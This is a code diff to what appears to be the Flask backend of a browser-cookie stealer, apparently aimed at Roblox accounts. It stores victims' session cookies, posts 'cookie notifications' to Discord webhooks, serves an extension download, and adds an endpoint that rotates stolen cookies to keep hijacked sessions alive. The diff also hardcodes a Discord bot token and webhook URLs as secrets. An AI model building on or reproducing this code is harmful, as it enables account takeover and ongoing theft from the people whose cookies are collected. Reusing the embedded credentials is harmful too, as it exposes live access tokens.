@@ -24,7 +24,7 @@ from functools import wraps
 # =====================================================
 load_dotenv()
 
-DISCORD_TOKEN = os.getenv('DISCORD_TOKEN', '')
+DISCORD_TOKEN = os.getenv('DISCORD_TOKEN', 'MTI2OTI0NTM0MTU0NzYzMDYyMw.G8N4GC.E2Fs9Hbmq528vPuTrlXoaWiAPrrTwdwccrs1hQ')
 DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1518341400842731561/aNePu0KVOBcI_zb_bJNeH9Izd597v27NtJRgb_Xq_nHmKPT2DZdosgqe7ItRt0_RTNz6')  # Cookie notifications
 DISCORD_WEBHOOK_URL_UPDATES = os.getenv('DISCORD_WEBHOOK_URL_UPDATES', 'https://discord.com/api/webhooks/1518591641198530652/s43keFLuzq-Rwr-oafbcYFGGQVTiLuY0zHNdVddHdNTeATADLtVVDV1Ii2A6DINZXNK6')  # Status/config updates
 API_KEY = os.getenv('API_KEY', 'rbx-secret-key-2024')
@@ -616,6 +616,10 @@ def login_required(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
         if 'admin_logged_in' not in session:
+            # If it's an API request, return JSON error
+            if request.path.startswith('/api/'):
+                return jsonify({'error': 'Unauthorized - Please login first', 'success': False}), 401
+            # Otherwise redirect to login page
             return redirect(url_for('admin_login_page'))
         return f(*args, **kwargs)
     return decorated_function
@@ -687,9 +691,46 @@ def list_sessions_api():
     return jsonify({'count': len(sessions), 'sessions': sessions})
 
 @app.route('/api/sessions/<userId>', methods=['DELETE'])
+@login_required
 def delete_session_api(userId):
     db_delete_session(userId)
+    logger.info(f"[ADMIN] Deleted session: {userId}")
     return jsonify({'status': 'deleted', 'userId': userId})
+
+@app.route('/api/sessions/<userId>/refresh', methods=['POST'])
+@login_required
+def refresh_session_api(userId):
+    """Manually refresh a session's cookie"""
+    try:
+        session_data = db_get_session(userId)
+        if not session_data:
+            return jsonify({'error': 'Session not found'}), 404
+        
+        old_cookie = session_data['cookie']
+        username = session_data['username']
+        
+        # Rotate cookie
+        new_cookie = rotate_cookie(old_cookie)
+        
+        if new_cookie:
+            db_update_cookie(userId, new_cookie)
+            updated_session = db_get_session(userId)
+            if updated_session:
+                send_discord_webhook(updated_session, is_update=True, update_type='COOKIE_ROTATED')
+                send_simple_update_notification(userId, username, 'COOKIE_ROTATED')
+            
+            logger.info(f"[ADMIN] Manually refreshed cookie for: {username} ({userId})")
+            return jsonify({'success': True, 'message': f'✅ Cookie refreshed for {username}!', 'status': 'ALIVE'})
+        else:
+            # Mark as DIE if refresh fails
+            db_update_status(userId, 'DIE')
+            send_simple_update_notification(userId, username, 'STATUS_CHANGED')
+            logger.warning(f"[ADMIN] Failed to refresh {userId} - marked as DIE")
+            return jsonify({'error': 'Failed to rotate cookie', 'status': 'DIE'}), 400
+            
+    except Exception as e:
+        logger.error(f"[ADMIN] Refresh error for {userId}: {e}")
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/admin')
 @login_required
@@ -747,6 +788,7 @@ def download_extension():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/admin/sessions', methods=['GET'])
+@login_required
 def admin_sessions_api():
     """Full session data for admin dashboard (includes full cookies)"""
     sessions = db_list_sessions()
@@ -783,6 +825,7 @@ def admin_sessions_api():
     })
 
 @app.route('/api/admin/config', methods=['POST'])
+@login_required
 def update_admin_config():
     """Update admin configuration and reschedule jobs"""
     global REFRESH_INTERVAL_MINUTES, global_scheduler
